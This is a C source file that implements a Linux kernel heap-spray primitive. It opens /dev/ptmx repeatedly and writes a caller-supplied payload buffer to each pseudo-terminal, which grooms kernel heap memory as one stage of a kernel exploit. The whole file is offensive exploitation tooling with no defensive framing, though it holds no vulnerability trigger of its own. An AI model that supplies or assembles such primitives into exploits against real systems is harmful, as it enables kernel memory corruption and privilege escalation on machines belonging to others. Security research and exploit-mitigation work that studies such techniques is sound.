#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

typedef struct {
    int *ptmx_fds;
    size_t fd_count;
    size_t write_size;
    void *payload;
} tty_write_buffer_heap_spray_ctx_t;

int init_tty_write_buffer_heap_spray(tty_write_buffer_heap_spray_ctx_t *ctx,
                                     size_t fd_count, size_t write_size) {
    size_t i;

    if (!ctx || !fd_count || !write_size) {
        return -EINVAL;
    }

    memset(ctx, 0, sizeof(*ctx));
    ctx->ptmx_fds = malloc(sizeof(*ctx->ptmx_fds) * fd_count);
    ctx->payload = calloc(1, write_size);
    if (!ctx->ptmx_fds || !ctx->payload) {
        return -ENOMEM;
    }

    for (i = 0; i < fd_count; i++) {
        ctx->ptmx_fds[i] = -1;
    }

    ctx->fd_count = fd_count;
    ctx->write_size = write_size;
    return 0;
}

int execute_tty_write_buffer_heap_spray(tty_write_buffer_heap_spray_ctx_t *ctx) {
    size_t i;

    if (!ctx || !ctx->ptmx_fds || !ctx->payload) {
        return -EINVAL;
    }

    for (i = 0; i < ctx->fd_count; i++) {
        ctx->ptmx_fds[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);
        if (ctx->ptmx_fds[i] < 0) {
            return -errno;
        }
        if (write(ctx->ptmx_fds[i], ctx->payload, ctx->write_size) !=
            (ssize_t)ctx->write_size) {
            return -EIO;
        }
    }

    return 0;
}

void cleanup_tty_write_buffer_heap_spray(tty_write_buffer_heap_spray_ctx_t *ctx) {
    size_t i;

    if (!ctx) {
        return;
    }

    if (ctx->ptmx_fds) {
        for (i = 0; i < ctx->fd_count; i++) {
            if (ctx->ptmx_fds[i] >= 0) {
                close(ctx->ptmx_fds[i]);
            }
        }
    }

    free(ctx->ptmx_fds);
    free(ctx->payload);
    memset(ctx, 0, sizeof(*ctx));
}
